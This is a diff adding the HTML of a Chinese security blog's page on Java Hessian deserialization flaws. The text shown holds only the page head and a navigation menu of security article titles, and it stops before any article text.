@@ -1,0 +1,772 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+
+<head><meta name="generator" content="Hexo 3.9.0">
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1.0, user-scalable=no">
+    <script src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" async></script>
+
+    
+      <link rel="icon" href="/kanxi.jpg">
+    
+
+    <title>
+        
+          Java Hessian反序列化漏洞 - Mi1k7ea
+        
+    </title>
+
+    <!-- Spectre.css framework -->
+    <link rel="stylesheet" href="/css/spectre.min.css">
+    <link rel="stylesheet" href="/css/spectre-exp.min.css">
+    <link rel="stylesheet" href="/css/spectre-icons.min.css">
+
+    <!-- Noto Sans TC -->
+    <link href="https://fonts.googleapis.com/css?family=Noto+Sans+TC" rel="stylesheet">
+    <!-- Noto Sans SC -->
+    <link href="https://fonts.googleapis.com/css?family=Noto+Sans+SC" rel="stylesheet">
+    <!-- Noto Sans -->
+    <link href="https://fonts.googleapis.com/css?family=Noto+Sans" rel="stylesheet">
+
+    <!-- theme css & js -->
+    <link rel="stylesheet" href="/css/book.css">
+    <script src="/js/book.js"></script>
+
+    <!-- tocbot -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.min.js"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.css">
+    
+    <!-- katex -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+
+    
+    
+<script src="https://cdnjs.cloudflare.com/ajax/libs/zooming/2.1.1/zooming.min.js"></script>
+<script>
+document.addEventListener('DOMContentLoaded', function () {
+    const zooming = new Zooming()
+    zooming.listen('img')
+})
+</script>
+
+</head>
+
+<body>
+
+<div class="container">
+  <div class="book-container">
+    <div class="columns">
+      <div class="column col-2 hide-lg">
+        <div class="book-sidebar">
+  <h4 class="site-meta">
+    <a href="/">Mi1k7ea</a>
+  </h4>
+  <div class="sidebar-content">
+    <p>Good Good Study</p>
+<ul>
+<li><strong><a href="/archives">归档</a></strong></li>
+</ul>
+<hr>
+<ul>
+<li><strong>Web安全</strong><ul>
+<li>Web安全基础&amp;Tricks<ul>
+<li><a href="/2019/10/14/文件上传漏洞总结/">文件上传攻击框架</a></li>
+<li><a href="/2019/10/04/CSWSH漏洞总结/">CSWSH漏洞总结</a></li>
+<li><a href="/2019/09/28/SSI注入漏洞总结/">SSI注入漏洞总结</a></li>
+<li><a href="/2019/08/20/JSONP跨域漏洞总结/">JSONP跨域漏洞总结</a></li>
+<li><a href="/2019/08/18/CORS跨域漏洞总结/">CORS跨域漏洞总结</a></li>
+<li><a href="/2020/01/04/浅析XSSI漏洞/">浅析XSSI漏洞</a></li>
+<li><a href="/2019/08/18/利用HTML注入劫持标签Bypass-CSP/">利用HTML注入劫持标签Bypass CSP</a></li>
+<li><a href="/2019/08/11/NoSQL注入之MongoDB/">NoSQL注入之MongoDB</a></li>
+<li><a href="/2019/08/10/Flash安全总结/">Flash安全总结</a></li>
+<li><a href="/2020/01/21/CSRF-Tricks小结/">CSRF Tricks小结</a></li>
+<li><a href="/2019/08/05/利用Flash进行Json-CSRF攻击/">利用Flash进行Json CSRF攻击</a></li>
+<li><a href="/2019/07/31/SWFUpload-swf的Flash型XSS分析/">SWFUpload.swf的Flash型XSS分析</a></li>
+<li><a href="/2019/07/30/ZeroClipboard-swf的Flash型XSS分析/">ZeroClipboard.swf的Flash型XSS分析</a></li>
+<li><a href="/2019/07/28/Flash型CSRF总结/">Flash型CSRF总结</a></li>
+<li><a href="/2019/07/21/Flash型XSS小结/">Flash型XSS总结</a></li>
+<li><a href="/2019/06/30/XSS从弹框到RCE/">XSS从弹框到RCE（IE）</a></li>
+<li><a href="/2019/06/30/命令注入Bypass技巧小结/">命令注入Bypass技巧小结</a></li>
+<li><a href="/2019/06/25/浅析DOM型XSS/">浅析DOM型XSS</a></li>
+<li><a href="/2019/03/22/图片XSS小结/">图片XSS小结</a></li>
+<li><a href="/2019/02/24/CSP策略及绕过技巧小结/">CSP策略及绕过技巧小结</a></li>
+<li><a href="/2019/02/19/一些加载XSS-Payload的标签/">一些加载XSS Payload的标签</a></li>
+<li><a href="/2019/02/16/个人XSS-payload收集/">个人XSS payload收集</a></li>
+<li><a href="/2020/01/26/浅析XSSJacking/">浅析XSSJacking</a></li>
+<li><a href="/2019/01/30/常见Web漏洞类型/">常见Web漏洞类型总结</a></li>
+<li><a href="/2019/01/01/Sqli-labs-writeup/">Sqli-labs Less1-20</a></li>
+<li><a href="/2019/01/01/SQL注入写WebShell方式小结/">SQL注入写WebShell方式小结</a></li>
+</ul>
+</li>
+<li>Web安全之机器学习</li>
+<li>WriteUp Web<ul>
+<li><a href="/2019/10/20/InCTF-2019-PHP三题复现/">InCTF 2019 PHP+1,+1.5,+2.5三题复现</a></li>
+<li><a href="/2019/10/05/upload-labs-WriteUp/">Upload-Labs WriteUp</a></li>
+<li><a href="/2019/09/28/bWAPP之Cross-Origin-Resource-Sharing-AJAX/">bWAPP之Cross-Origin Resource Sharing (AJAX)</a></li>
+<li><a href="/2019/07/02/DVWA之JavaScript攻击/">DVWA之JavaScript攻击</a></li>
+<li><a href="/2019/06/27/一道Bypass正则过滤的反序列化漏洞题目/">一道Bypass正则过滤的反序列化漏洞题目</a></li>
+<li><a href="/2019/06/27/从一道CTF题看如何利用本地DTD文件实现XXE攻击/">从一道CTF题看如何通过本地DTD文件利用XXE实现回显</a></li>
+<li><a href="/2019/03/31/0CTF-Web-writeup/">0CTF Web writeup</a></li>
+<li><a href="/2019/03/29/Securinets-CTF-Web-writeup/">Securinets CTF Web writeup</a></li>
+<li><a href="/2019/03/21/Teaser-CONFidence-CTF-Web-writeup/">Teaser CONFidence CTF Web writeup</a></li>
+<li><a href="/2019/03/17/SpEL注入之javacon/">SpEL注入之javacon</a></li>
+<li><a href="/2019/03/13/AeroCTF-writeupup之board-tracking-system/">AeroCTF writeupup之board tracking system</a></li>
+<li><a href="/2019/03/09/TAMUctf-Web-writeup/">TAMUctf Web writeup</a></li>
+<li><a href="/2019/02/21/一道绕过CSP的XSS题目/">一道绕过CSP的XSS题目</a></li>
+<li><a href="/2019/02/15/XSS闯关之xss-haozi-me/">XSS闯关之xss.haozi.me</a></li>
+<li><a href="/2019/01/01/通过DVWA学习DOM型XSS/">DVWA之DOM型XSS</a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li><strong>Java</strong><ul>
+<li>Java安全<ul>
+<li><a href="/2019/02/01/Java动态代理机制/">Java动态代理机制</a></li>
+<li><a href="/2019/02/01/Java反射机制/">Java反射机制</a></li>
+<li><a href="/2019/02/03/Java序列化和反序列化机制/">Java序列化和反序列化机制</a></li>
+<li><a href="/2019/09/01/Java-RMI原理与使用/">Java RMI原理与使用</a></li>
+<li><a href="/2019/11/25/（转）Java代码审计指南">（转）Java代码审计指南</a></li>
+<li><a href="/2019/11/25/（转）Java项目中常见jar包的说明">（转）Java项目中常见jar包的说明</a></li>
+<li><a href="/2019/06/09/探讨XXE防御之setFeature设置/">探讨XXE防御之setFeature设置</a></li>
+<li><a href="/2019/05/26/XML注入之SAXBuilder/">XML注入之SAXBuilder</a></li>
+<li><a href="/2019/05/26/XML注入之SAXParser/">XML注入之SAXParser</a></li>
+<li><a href="/2019/05/24/XML注入之SAXReader/">XML注入之SAXReader</a></li>
+<li><a href="/2019/02/13/XML注入之DocumentBuilder/">XML注入之DocumentBuilder与XXE攻击防御</a></li>
+<li><a href="/2019/09/15/浅析JNDI注入/">浅析JNDI注入</a></li>
+<li><a href="/2020/01/10/SpEL表达式注入漏洞总结/">SpEL表达式注入漏洞总结</a></li>
+<li><a href="/2019/12/08/浅析Java-SPI安全/">浅析Java SPI安全</a></li>
+<li><a href="/2019/02/06/Java反序列化漏洞/">Java反序列化漏洞</a></li>
+<li><a href="/2019/01/01/XMLDecoder反序列化漏洞/">Java XMLDecoder反序列化漏洞</a></li>
+<li><a href="/2019/10/21/XStream反序列化漏洞/">Java XStream反序列化漏洞</a></li>
+<li><a href="/2019/11/29/Java-SnakeYaml反序列化漏洞">Java SnakeYaml反序列化漏洞</a></li>
+<li><a href="/2019/12/07/Java-AMF3反序列化漏洞/">Java AMF3反序列化漏洞</a></li>
+<li><a href="/2020/01/25/Java-Hessian反序列化漏洞/">Java Hessian反序列化漏洞</a></li>
+<li><a href="/2019/11/13/Fastjson系列五——高版本JDK绕过及检测与防御/">Fastjson系列五——高版本JDK绕过及检测与防御</a></li>
+<li><a href="/2019/11/11/Fastjson系列四——1-2-25-1-2-47反序列化漏洞（无需开启AutoType）/">Fastjson系列四——1.2.25-1.2.47反序列化漏洞（无需开启AutoType）</a></li>
+<li><a href="/2019/11/10/Fastjson系列三——历史版本补丁绕过（需开启AutoType）/">Fastjson系列三——历史版本补丁绕过（需开启AutoType）</a></li>
+<li><a href="/2019/11/07/Fastjson系列二——1-2-22-1-2-24反序列化漏洞/">Fastjson系列二——1.2.22-1.2.24反序列化漏洞</a></li>
+<li><a href="/2019/11/03/Fastjson系列一——反序列化漏洞基本原理/">Fastjson系列一——反序列化漏洞基本原理</a></li>
+<li><a href="/2019/11/24/Jackson系列七——其他Gadgets/">Jackson系列七——其他Gadgets与检测防御</a></li>
+<li><a href="/2019/11/24/Jackson系列六——CVE-2019-12814（基于JDOM-XSLTransformer利用链）/">Jackson系列六——CVE-2019-12814（基于JDOM XSLTransformer利用链）</a></li>
+<li><a href="/2019/11/22/Jackson系列五——CVE-2019-12384（基于logback利用链）/">Jackson系列五——CVE-2019-12384（基于logback利用链）</a></li>
+<li><a href="/2019/11/19/Jackson系列四——CVE-2019-12086（基于MiniAdmin利用链）/">Jackson系列四——CVE-2019-12086（基于MiniAdmin利用链）</a></li>
+<li><a href="/2019/11/17/Jackson系列三—CVE-2017-1748（基于ClassPathXmlApplicationContext利用链）/">Jackson系列三——CVE-2017-17485（基于ClassPathXmlApplicationContext利用链）</a></li>
+<li><a href="/2019/11/16/Jackson系列二——CVE-2017-7525（基于TemplatesImpl利用链）/">Jackson系列二——CVE-2017-7525（基于TemplatesImpl利用链）</a></li>
+<li><a href="/2019/11/13/Jackson系列一——反序列化漏洞基本原理/">Jackson系列一——反序列化漏洞基本原理</a></li>
+</ul>
+</li>
+<li>Struts2</li>
+<li>Spring<ul>
+<li><a href="/2019/01/01/Spring基础篇之基本概念/">Spring基础篇之基本概念</a></li>
+<li><a href="/2019/01/01/Spring基础篇之IoC容器/">Spring基础篇之IoC容器</a></li>
+<li><a href="/2019/01/01/Spring基础篇之Bean/">Spring基础篇之Bean</a></li>
+<li><a href="/2019/01/01/Spring基础篇之DI（依赖注入）/">Spring基础篇之DI（依赖注入）</a></li>
+<li><a href="/2019/01/01/Spring基础篇之Bean装配/">Spring基础篇之Bean装配</a></li>
+<li><a href="/2019/01/01/Spring基础篇之AOP/">Spring基础篇之AOP</a></li>
+<li><a href="/2019/01/01/Spring基础篇之JDBC框架/">Spring基础篇之JDBC框架</a></li>
+<li><a href="/2019/01/01/Spring基础篇之事务管理/">Spring基础篇之事务管理</a></li>
+<li><a href="/2019/09/02/由JNDI注入导致的Spring-Framework反序列化漏洞/">由JNDI注入引发的Spring Framework反序列化漏洞</a></li>
+<li><a href="/2019/04/05/Spring-Data-Rest之cve-2017-8046分析/">浅析Spring Data Rest之cve-2017-8046</a></li>
+</ul>
+</li>
+<li>SpringCloud</li>
+</ul>
+</li>
+<li><strong>PHP</strong><ul>
+<li>PHP安全<ul>
+<li><a href="/2019/08/25/浅谈PHP-FPM安全/">浅谈PHP-FPM安全</a></li>
+<li><a href="/2019/08/03/从蚁剑插件看利用PHP-FPM绕过disable-functions/">从蚁剑插件看利用PHP-FPM绕过disable_functions</a></li>
+<li><a href="/2019/07/20/浅谈几种Bypass-open-basedir的方法/">浅谈几种Bypass open_basedir的方法</a></li>
+<li><a href="/2019/07/16/PHP中mail-函数安全问题与防御/">PHP中mail()函数安全问题与防御</a></li>
+<li><a href="/2019/07/04/浅谈escapeshellarg与参数注入/">浅谈escapeshellarg逃逸与参数注入</a></li>
+<li><a href="/2019/07/02/浅析preg-replace与preg-match/">浅析preg_replace与preg_match</a></li>
+<li><a href="/2019/06/21/PHP弱类型小结/">PHP弱类型及相关函数Bypass小结</a></li>
+<li><a href="/2019/06/20/PHP变量覆盖漏洞/">PHP变量覆盖漏洞小结</a></li>
+<li><a href="/2019/06/09/巧用get-defined-functions隐藏WebShell/">巧用get_defined_functions隐藏WebShell</a></li>
+<li><a href="/2019/06/07/从一道题看PHP7-4的FFI绕过disable-functions/">从RCTF nextphp看PHP7.4的FFI绕过disable_functions</a></li>
+<li><a href="/2019/06/02/浅谈几种Bypass-disable-functions的方法/">浅谈几种Bypass disable_functions的方法</a></li>
+<li><a href="/2019/05/04/PHP对象注入之pop链构造/">PHP对象注入之pop链构造</a></li>
+<li><a href="/2019/04/21/PHP-session反序列化漏洞/">PHP session反序列化漏洞</a></li>
+<li><a href="/2019/01/31/PHP伪协议/">PHP伪协议</a></li>
+<li><a href="/2019/01/01/phar反序列化漏洞/">phar反序列化漏洞</a></li>
+<li><a href="/2019/01/01/Windows下的一种PHP隐蔽后门姿势/">Windows下的一种PHP隐藏后门姿势</a></li>
+<li><a href="/2019/01/01/PHP反序列化漏洞/">PHP unserialize反序列化漏洞</a></li>
+<li><a href="/2019/01/01/PHP内存型木马/">PHP内存型木马</a></li>
+</ul>
+</li>
+<li>CMS<ul>
+<li><a href="/2019/01/02/PHP代码审计实战之盾灵CMS/">PHP代码审计实战之盾灵CMS</a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li><strong>Python</strong><ul>
+<li>Python安全<ul>
+<li><a href="/2019/06/02/浅析Python-Flask-SSTI/">浅析Python Flask SSTI</a></li>
+<li><a href="/2019/05/31/Python沙箱逃逸小结/">Python沙箱逃逸小结</a></li>
+<li><a href="/2019/01/01/PyYAML反序列化漏洞/">Python PyYAML反序列化漏洞</a></li>
+<li><a href="/2019/01/01/cPickle反序列化漏洞/">Python cPickle反序列化漏洞</a></li>
+</ul>
+</li>
+<li>安全开发<ul>
+<li><a href="/2019/06/30/AWD文件监控脚本/">AWD文件监控脚本</a></li>
+<li><a href="/2019/01/01/Python安全小工具之反编译pyc文件/">Python安全小工具之反编译pyc文件</a></li>
+</ul>
+</li>
+<li>爬虫</li>
+<li>Django</li>
+</ul>
+</li>
+<li><strong>JavaScript</strong><ul>
+<li>JavaScript安全<ul>
+<li><a href="/2019/10/20/浅析JavaScript原型链污染攻击/">浅析JavaScript原型链污染攻击</a></li>
+</ul>
+</li>
+<li>NodeJS</li>
+<li>AngularJS</li>
+</ul>
+</li>
+<li><strong>GO</strong><ul>
+<li>GO安全<ul>
+<li><a href="/2020/01/01/浅析Influxdb认证绕过漏洞/">浅析Influxdb认证绕过漏洞</a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li><strong>二进制安全</strong><ul>
+<li>二进制基础<ul>
+<li><a href="/2019/05/24/GOT表-PLT表与动态链接/">ELF动态链接,PLT和GOT</a></li>
+<li><a href="/2019/04/27/堆基础/">堆基础</a></li>
+<li><a href="/2019/04/15/ELF二进制格式/">ELF二进制格式</a></li>
+<li><a href="/2019/03/03/栈及栈帧/">栈基础</a></li>
+<li><a href="/2019/02/09/ELF安全防御机制小结/">ELF安全防御机制小结</a></li>
+<li><a href="/2019/01/28/IA-32寄存器/">IA-32（Intel Architecture 32位）寄存器</a></li>
+<li><a href="/2019/01/01/Linux环境与相关工具/">Linux环境与相关工具</a></li>
+</ul>
+</li>
+<li>C/C++<ul>
+<li><a href="/2019/03/24/C编写实现Linux反弹shell/">C编写实现Linux反弹shell</a></li>
+</ul>
+</li>
+<li>逆向工程</li>
+<li>Fuzzing</li>
+<li>Pwn<ul>
+<li><a href="/2019/04/20/花式栈溢出之stack-pivoting/">花式栈溢出之stack pivoting</a></li>
+<li><a href="/2019/04/12/中级ROP之ret2csu/">栈溢出之ret2csu</a></li>
+<li><a href="/2019/04/09/蒸米ROP学习笔记/">蒸米32位及64位ROP笔记</a></li>
+<li><a href="/2019/04/07/pwntools笔记/">pwntools笔记</a></li>
+<li><a href="/2019/03/23/花式栈溢出之Stack-smash/">花式栈溢出之Stack smash</a></li>
+<li><a href="/2019/03/05/栈溢出之ret2libc/">栈溢出之ret2libc</a></li>
+<li><a href="/2019/03/03/栈溢出之ret2syscall/">栈溢出之ret2syscall</a></li>
+<li><a href="/2019/03/03/栈溢出之ret2shellcode/">栈溢出之ret2shellcode</a></li>
+<li><a href="/2019/03/03/ROP之ret2text/">ROP基础及栈溢出之ret2text</a></li>
+<li><a href="/2019/03/03/栈溢出基本原理/">栈溢出基本原理</a></li>
+</ul>
+</li>
+<li>WriteUp Pwn<ul>
+<li><a href="/2019/03/08/TAMUctf-Pwn-writeup/">TAMUctf Pwn writeup</a></li>
+</ul>
+</li>
+<li>WriteUp Reverse<ul>
+<li><a href="/2019/01/01/HITB_Binary_100_writeup/">HITB Binary 100 writeup</a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li><strong>渗透测试</strong><ul>
+<li>基础&amp;Tricks</li>
+<li>Kali</li>
+<li>Metasploit</li>
+<li>内网渗透</li>
+<li>提权<ul>
+<li><a href="/2019/01/01/关于本地提权的学习笔记（一）：Administrator提权到System">Administrator提权到System</a></li>
+<li><a href="/2019/01/01/关于本地提权的学习笔记（二）：注入进程和利用漏洞提权">注入进程和利用漏洞提权</a></li>
+</ul>
+</li>
+<li>免杀</li>
+<li>工具</li>
+</ul>
+</li>
+<li><strong>OS</strong><ul>
+<li>Windows<ul>
+<li><a href="/2019/01/01/将Python脚本转换为exe">将Python脚本转换为exe</a></li>
+<li><a href="/2019/01/01/几个查看用户信息的Windows程序">几个查看用户信息的Windows程序</a></li>
+</ul>
+</li>
+<li>Linux</li>
+</ul>
+</li>
+</ul>
+
+  </div>
+</div>
+
+<script src="/js/book-sidebar.js"></script>
+
+<script>
+collapse_sidebar(2)
+highlight_tab()
+show_sidebar()
+</script>
+      </div>
+
+      <div class="column col-8 col-lg-12">
+        <div class="book-content">
+          <div class="book-navbar">
+  <header class="navbar">
+  <section class="navbar-section">
+    <img class="navbar-icon" src="/kanxi.jpg">
+  </section>
+  <section class="navbar-center">
+    Mi1k7ea
+  </section>
+  <section class="navbar-section">
+    <label class="accordion-header c-hand" for="accordion-sidebar">
+      <i class="icon icon-menu"></i>
+    </label>
+  </section>
+</header>
+
+<div class="accordion">
+  <input type="checkbox" id="accordion-sidebar" name="accordion-checkbox" hidden>
+  <div class="accordion-body">
+    <p>Good Good Study</p>
+<ul>
+<li><strong><a href="/archives">归档</a></strong></li>
+</ul>
+<hr>
+<ul>
+<li><strong>Web安全</strong><ul>
+<li>Web安全基础&amp;Tricks<ul>
+<li><a href="/2019/10/14/文件上传漏洞总结/">文件上传攻击框架</a></li>
+<li><a href="/2019/10/04/CSWSH漏洞总结/">CSWSH漏洞总结</a></li>
+<li><a href="/2019/09/28/SSI注入漏洞总结/">SSI注入漏洞总结</a></li>
+<li><a href="/2019/08/20/JSONP跨域漏洞总结/">JSONP跨域漏洞总结</a></li>
+<li><a href="/2019/08/18/CORS跨域漏洞总结/">CORS跨域漏洞总结</a></li>
+<li><a href="/2020/01/04/浅析XSSI漏洞/">浅析XSSI漏洞</a></li>
+<li><a href="/2019/08/18/利用HTML注入劫持标签Bypass-CSP/">利用HTML注入劫持标签Bypass CSP</a></li>
+<li><a href="/2019/08/11/NoSQL注入之MongoDB/">NoSQL注入之MongoDB</a></li>
+<li><a href="/2019/08/10/Flash安全总结/">Flash安全总结</a></li>
+<li><a href="/2020/01/21/CSRF-Tricks小结/">CSRF Tricks小结</a></li>
+<li><a href="/2019/08/05/利用Flash进行Json-CSRF攻击/">利用Flash进行Json CSRF攻击</a></li>
+<li><a href="/2019/07/31/SWFUpload-swf的Flash型XSS分析/">SWFUpload.swf的Flash型XSS分析</a></li>
+<li><a href="/2019/07/30/ZeroClipboard-swf的Flash型XSS分析/">ZeroClipboard.swf的Flash型XSS分析</a></li>
+<li><a href="/2019/07/28/Flash型CSRF总结/">Flash型CSRF总结</a></li>
+<li><a href="/2019/07/21/Flash型XSS小结/">Flash型XSS总结</a></li>
+<li><a href="/2019/06/30/XSS从弹框到RCE/">XSS从弹框到RCE（IE）</a></li>
+<li><a href="/2019/06/30/命令注入Bypass技巧小结/">命令注入Bypass技巧小结</a></li>
+<li><a href="/2019/06/25/浅析DOM型XSS/">浅析DOM型XSS</a></li>
+<li><a href="/2019/03/22/图片XSS小结/">图片XSS小结</a></li>
+<li><a href="/2019/02/24/CSP策略及绕过技巧小结/">CSP策略及绕过技巧小结</a></li>
+<li><a href="/2019/02/19/一些加载XSS-Payload的标签/">一些加载XSS Payload的标签</a></li>
+<li><a href="/2019/02/16/个人XSS-payload收集/">个人XSS payload收集</a></li>
+<li><a href="/2020/01/26/浅析XSSJacking/">浅析XSSJacking</a></li>
+<li><a href="/2019/01/30/常见Web漏洞类型/">常见Web漏洞类型总结</a></li>
+<li><a href="/2019/01/01/Sqli-labs-writeup/">Sqli-labs Less1-20</a></li>
+<li><a href="/2019/01/01/SQL注入写WebShell方式小结/">SQL注入写WebShell方式小结</a></li>
+</ul>
+</li>
+<li>Web安全之机器学习</li>
+<li>WriteUp Web<ul>
+<li><a href="/2019/10/20/InCTF-2019-PHP三题复现/">InCTF 2019 PHP+1,+1.5,+2.5三题复现</a></li>
+<li><a href="/2019/10/05/upload-labs-WriteUp/">Upload-Labs WriteUp</a></li>
+<li><a href="/2019/09/28/bWAPP之Cross-Origin-Resource-Sharing-AJAX/">bWAPP之Cross-Origin Resource Sharing (AJAX)</a></li>
+<li><a href="/2019/07/02/DVWA之JavaScript攻击/">DVWA之JavaScript攻击</a></li>
+<li><a href="/2019/06/27/一道Bypass正则过滤的反序列化漏洞题目/">一道Bypass正则过滤的反序列化漏洞题目</a></li>
+<li><a href="/2019/06/27/从一道CTF题看如何利用本地DTD文件实现XXE攻击/">从一道CTF题看如何通过本地DTD文件利用XXE实现回显</a></li>
+<li><a href="/2019/03/31/0CTF-Web-writeup/">0CTF Web writeup</a></li>
+<li><a href="/2019/03/29/Securinets-CTF-Web-writeup/">Securinets CTF Web writeup</a></li>
+<li><a href="/2019/03/21/Teaser-CONFidence-CTF-Web-writeup/">Teaser CONFidence CTF Web writeup</a></li>
+<li><a href="/2019/03/17/SpEL注入之javacon/">SpEL注入之javacon</a></li>
+<li><a href="/2019/03/13/AeroCTF-writeupup之board-tracking-system/">AeroCTF writeupup之board tracking system</a></li>
+<li><a href="/2019/03/09/TAMUctf-Web-writeup/">TAMUctf Web writeup</a></li>
+<li><a href="/2019/02/21/一道绕过CSP的XSS题目/">一道绕过CSP的XSS题目</a></li>
+<li><a href="/2019/02/15/XSS闯关之xss-haozi-me/">XSS闯关之xss.haozi.me</a></li>
+<li><a href="/2019/01/01/通过DVWA学习DOM型XSS/">DVWA之DOM型XSS</a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li><strong>Java</strong><ul>
+<li>Java安全<ul>
+<li><a href="/2019/02/01/Java动态代理机制/">Java动态代理机制</a></li>
+<li><a href="/2019/02/01/Java反射机制/">Java反射机制</a></li>
+<li><a href="/2019/02/03/Java序列化和反序列化机制/">Java序列化和反序列化机制</a></li>
+<li><a href="/2019/09/01/Java-RMI原理与使用/">Java RMI原理与使用</a></li>
+<li><a href="/2019/11/25/（转）Java代码审计指南">（转）Java代码审计指南</a></li>
+<li><a href="/2019/11/25/（转）Java项目中常见jar包的说明">（转）Java项目中常见jar包的说明</a></li>
+<li><a href="/2019/06/09/探讨XXE防御之setFeature设置/">探讨XXE防御之setFeature设置</a></li>
+<li><a href="/2019/05/26/XML注入之SAXBuilder/">XML注入之SAXBuilder</a></li>
+<li><a href="/2019/05/26/XML注入之SAXParser/">XML注入之SAXParser</a></li>
+<li><a href="/2019/05/24/XML注入之SAXReader/">XML注入之SAXReader</a></li>
+<li><a href="/2019/02/13/XML注入之DocumentBuilder/">XML注入之DocumentBuilder与XXE攻击防御</a></li>
+<li><a href="/2019/09/15/浅析JNDI注入/">浅析JNDI注入</a></li>
+<li><a href="/2020/01/10/SpEL表达式注入漏洞总结/">SpEL表达式注入漏洞总结</a></li>
+<li><a href="/2019/12/08/浅析Java-SPI安全/">浅析Java SPI安全</a></li>
+<li><a href="/2019/02/06/Java反序列化漏洞/">Java反序列化漏洞</a></li>
+<li><a href="/2019/01/01/XMLDecoder反序列化漏洞/">Java XMLDecoder反序列化漏洞</a></li>
+<li><a href="/2019/10/21/XStream反序列化漏洞/">Java XStream反序列化漏洞</a></li>
+<li><a href="/2019/11/29/Java-SnakeYaml反序列化漏洞">Java SnakeYaml反序列化漏洞</a></li>
+<li><a href="/2019/12/07/Java-AMF3反序列化漏洞/">Java AMF3反序列化漏洞</a></li>
+<li><a href="/2020/01/25/Java-Hessian反序列化漏洞/">Java Hessian反序列化漏洞</a></li>
+<li><a href="/2019/11/13/Fastjson系列五——高版本JDK绕过及检测与防御/">Fastjson系列五——高版本JDK绕过及检测与防御</a></li>
+<li><a href="/2019/11/11/Fastjson系列四——1-2-25-1-2-47反序列化漏洞（无需开启AutoType）/">Fastjson系列四——1.2.25-1.2.47反序列化漏洞（无需开启AutoType）</a></li>
+<li><a href="/2019/11/10/Fastjson系列三——历史版本补丁绕过（需开启AutoType）/">Fastjson系列三——历史版本补丁绕过（需开启AutoType）</a></li>
+<li><a href="/2019/11/07/Fastjson系列二——1-2-22-1-2-24反序列化漏洞/">Fastjson系列二——1.2.22-1.2.24反序列化漏洞</a></li>
+<li><a href="/2019/11/03/Fastjson系列一——反序列化漏洞基本原理/">Fastjson系列一——反序列化漏洞基本原理</a></li>
+<li><a href="/2019/11/24/Jackson系列七——其他Gadgets/">Jackson系列七——其他Gadgets与检测防御</a></li>
+<li><a href="/2019/11/24/Jackson系列六——CVE-2019-12814（基于JDOM-XSLTransformer利用链）/">Jackson系列六——CVE-2019-12814（基于JDOM XSLTransformer利用链）</a></li>
+<li><a href="/2019/11/22/Jackson系列五——CVE-2019-12384（基于logback利用链）/">Jackson系列五——CVE-2019-12384（基于logback利用链）</a></li>
+<li><a href="/2019/11/19/Jackson系列四——CVE-2019-12086（基于MiniAdmin利用链）/">Jackson系列四——CVE-2019-12086（基于MiniAdmin利用链）</a></li>
+<li><a href="/2019/11/17/Jackson系列三—CVE-2017-1748（基于ClassPathXmlApplicationContext利用链）/">Jackson系列三——CVE-2017-17485（基于ClassPathXmlApplicationContext利用链）</a></li>
+<li><a href="/2019/11/16/Jackson系列二——CVE-2017-7525（基于TemplatesImpl利用链）/">Jackson系列二——CVE-2017-7525（基于TemplatesImpl利用链）</a></li>
+<li><a href="/2019/11/13/Jackson系列一——反序列化漏洞基本原理/">Jackson系列一——反序列化漏洞基本原理</a></li>
+</ul>
+</li>
+<li>Struts2</li>
+<li>Spring<ul>
+<li><a href="/2019/01/01/Spring基础篇之基本概念/">Spring基础篇之基本概念</a></li>
+<li><a href="/2019/01/01/Spring基础篇之IoC容器/">Spring基础篇之IoC容器</a></li>
+<li><a href="/2019/01/01/Spring基础篇之Bean/">Spring基础篇之Bean</a></li>
+<li><a href="/2019/01/01/Spring基础篇之DI（依赖注入）/">Spring基础篇之DI（依赖注入）</a></li>
+<li><a href="/2019/01/01/Spring基础篇之Bean装配/">Spring基础篇之Bean装配</a></li>
+<li><a href="/2019/01/01/Spring基础篇之AOP/">Spring基础篇之AOP</a></li>
+<li><a href="/2019/01/01/Spring基础篇之JDBC框架/">Spring基础篇之JDBC框架</a></li>
+<li><a href="/2019/01/01/Spring基础篇之事务管理/">Spring基础篇之事务管理</a></li>
+<li><a href="/2019/09/02/由JNDI注入导致的Spring-Framework反序列化漏洞/">由JNDI注入引发的Spring Framework反序列化漏洞</a></li>
+<li><a href="/2019/04/05/Spring-Data-Rest之cve-2017-8046分析/">浅析Spring Data Rest之cve-2017-8046</a></li>
+</ul>
+</li>
+<li>SpringCloud</li>
+</ul>
+</li>
+<li><strong>PHP</strong><ul>
+<li>PHP安全<ul>
+<li><a href="/2019/08/25/浅谈PHP-FPM安全/">浅谈PHP-FPM安全</a></li>
+<li><a href="/2019/08/03/从蚁剑插件看利用PHP-FPM绕过disable-functions/">从蚁剑插件看利用PHP-FPM绕过disable_functions</a></li>
+<li><a href="/2019/07/20/浅谈几种Bypass-open-basedir的方法/">浅谈几种Bypass open_basedir的方法</a></li>
+<li><a href="/2019/07/16/PHP中mail-函数安全问题与防御/">PHP中mail()函数安全问题与防御</a></li>
+<li><a href="/2019/07/04/浅谈escapeshellarg与参数注入/">浅谈escapeshellarg逃逸与参数注入</a></li>
+<li><a href="/2019/07/02/浅析preg-replace与preg-match/">浅析preg_replace与preg_match</a></li>
+<li><a href="/2019/06/21/PHP弱类型小结/">PHP弱类型及相关函数Bypass小结</a></li>
+<li><a href="/2019/06/20/PHP变量覆盖漏洞/">PHP变量覆盖漏洞小结</a></li>
+<li><a href="/2019/06/09/巧用get-defined-functions隐藏WebShell/">巧用get_defined_functions隐藏WebShell</a></li>
+<li><a href="/2019/06/07/从一道题看PHP7-4的FFI绕过disable-functions/">从RCTF nextphp看PHP7.4的FFI绕过disable_functions</a></li>
+<li><a href="/2019/06/02/浅谈几种Bypass-disable-functions的方法/">浅谈几种Bypass disable_functions的方法</a></li>
+<li><a href="/2019/05/04/PHP对象注入之pop链构造/">PHP对象注入之pop链构造</a></li>
+<li><a href="/2019/04/21/PHP-session反序列化漏洞/">PHP session反序列化漏洞</a></li>
